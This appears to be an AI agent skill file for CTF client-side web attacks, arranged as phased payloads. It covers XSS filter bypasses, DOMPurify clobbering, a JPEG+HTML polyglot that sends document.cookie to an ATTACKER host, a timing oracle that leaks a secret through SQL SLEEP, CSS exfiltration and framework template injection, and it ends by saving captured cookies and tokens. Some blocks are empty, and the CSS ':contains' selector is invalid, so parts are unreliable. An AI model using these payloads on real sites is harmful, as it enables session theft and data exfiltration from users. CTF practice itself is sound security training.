---
name: web-client-side
description: "CTF client-side web attacks. XSS filter bypass, DOMPurify bypass via backend trust, DOM XSS jQuery hashchange, shadow DOM exfiltration, JPEG+HTML polyglot, image timing oracle, CSS text exfiltration without JS, Alpine.js/Hyperscript attribute execution. Triggers: 'xss', 'dom xss', 'client side attack', 'xss bypass', 'dompurify bypass', 'csp bypass', 'shadow dom', 'polyglot upload', 'css exfiltration', 'ctf web client'."
---

# CTF Web: Client-Side Attacks

XSS variants, DOMPurify bypass, shadow DOM, JPEG polyglots, CSS exfil.

---

## Phase 1: XSS Filter Bypass

```html
<!-- Case mixing -->
<ScRiPt>alert(1)</ScRiPt>
<sCrIpT SrC=//attacker.com/xss.js></sCrIpT>

<!-- Template literals (bypass quote filters) -->

<!-- HTML entities in event handlers -->

<!-- Hex/Unicode encoding -->

<!-- SVG-based -->
<svg><script>alert(1)</script></svg>
<svg onload=alert(1)>

<!-- Input with no quotes/brackets filter bypass -->

<!-- Angular template injection (if Angular) -->
{{constructor.constructor('alert(1)')()}}

<!-- Bypass DOMPurify (check version) -->
<!-- DOMPurify < 2.3.4 clobbering -->
<form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea>">
```

---

## Phase 2: DOMPurify Layer Mismatch

```javascript
// Inconsistent validation: frontend sanitizes → backend trusts autosave
// Target the backend endpoint directly, bypassing frontend DOMPurify

// Example: fetch autosave endpoint with unsanitized XSS:
fetch('/api/autosave', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
        content: ''
    })
});

// Unicode case folding bypass:
// ASCII-only regex: /script/i
// But: ＜ = full-width less-than (U+FF1C), renders as <
// Some sanitizers handle ASCII but miss full-width variants
```

---

## Phase 3: DOM XSS via jQuery Hashchange

```html
<!DOCTYPE html>
<!-- Trigger hash change via iframe to bypass interaction requirement -->
<iframe id="victim" src="https://TARGET/page"></iframe>
<script>
// Wait for iframe to load, then change hash:
document.getElementById('victim').onload = function() {
    this.contentWindow.location.hash = '#';
};
</script>
```

---

## Phase 4: Shadow DOM Exfiltration

```javascript
// Exfiltrate closed shadow root via attachShadow proxy:
const orig = Element.prototype.attachShadow;
Element.prototype.attachShadow = function(init) {
    const shadow = orig.call(this, {...init, mode: 'open'});  // force open
    return shadow;
};

// Eval to escape scope restrictions:
// If content has indirect eval via scope isolation:
const escaped = (0, eval);  // indirect eval = global scope
escaped('alert(document.cookie)');
```

---

## Phase 5: JPEG+HTML Polyglot Upload

```bash
# Create valid JPEG that also contains HTML/JS payload
# Exploits permissive MIME handling in file upload endpoints

# Method: append HTML after JPEG EOF marker (FFD9)
python3 << 'EOF'
with open('image.jpg', 'rb') as f:
    jpeg_data = f.read()

html_payload = b'<script>fetch("https://ATTACKER/?c="+document.cookie)</script>'
polyglot = jpeg_data + html_payload

with open('polyglot.jpg', 'wb') as f:
    f.write(polyglot)
EOF

# Upload as image, request with Accept: text/html or missing validation
# Server returns file, browser renders HTML section
```

---

## Phase 6: Image Load Timing Oracle

```javascript
// Cross-origin: measure time for image to load from internal GraphQL
// SQL SLEEP() in GraphQL query → slow response → longer load time

async function probe_char(known_prefix, test_char) {
    const query = `
    SELECT CASE WHEN SUBSTRING(secret,1,${known_prefix.length+1})='${known_prefix}${test_char}'
           THEN SLEEP(0.5) ELSE 0 END
    `;
    
    return new Promise(resolve => {
        const start = performance.now();
        const img = new Image();
        img.onload = img.onerror = () => resolve(performance.now() - start);
        img.src = `http://localhost:3000/graphql?query=${encodeURIComponent(query)}`;
    });
}

async function extract_secret() {
    let known = '';
    const charset = 'abcdefghijklmnopqrstuvwxyz0123456789{}_!';
    
    for (let pos = 0; pos < 50; pos++) {
        let best_char = '', best_time = 0;
        for (const c of charset) {
            const t = await probe_char(known, c);
            if (t > best_time) { best_time = t; best_char = c; }
        }
        known += best_char;
        if (known.endsWith('}')) break;
    }
    return known;
}
```

---

## Phase 7: CSS Text Exfiltration (No JS)

```html
<!-- Read text without JS using CSS injection + :has() selector -->
<!-- Requires CSP that allows styles but blocks scripts -->

<style>
/* If username contains 'a' → load attacker pixel */
input[value*="a"] ~ * {
    background: url(https://ATTACKER/?char=a);
}

/* Character-by-character using :has() + attribute selectors */
body:has(span:nth-child(1):contains("f")) {
    background: url(https://ATTACKER/?pos=0&char=f);
}
</style>

<!-- Modern CSS container queries (more powerful): -->
@container (min-width: 0px) {
    div:has(> span:first-child:contains("flag")) {
        background: url(https://ATTACKER/?found=flag);
    }
}
```

---

## Phase 8: Declarative Framework XSS

```html
<!-- Hyperscript attribute (CSP-safe?) -->
<div _="on click call alert(document.cookie)">Click me</div>

<!-- Alpine.js -->
<div x-data="{ cmd: 'alert(document.cookie)' }" x-init="eval(cmd)">

<!-- Vue template injection -->
<div>{{ $el.ownerDocument.defaultView.alert(1) }}</div>

<!-- HTMX -->
<button hx-get="javascript:alert(document.cookie)" hx-trigger="click">

<!-- AngularJS 1.x (if on page) -->
{{constructor.constructor('alert(document.cookie)')()}}
{{[].filter.constructor('alert(1)')()}}
```

---

## Output

Save to `.omop/engagement/ctf/web/`:
- `xss-payload.txt`: working XSS payload
- `exfil-data.txt`: captured cookies/tokens

## Next Phase

→ `ctf-web-auth-access` for auth bypass chains
→ `pentest-report` for final report
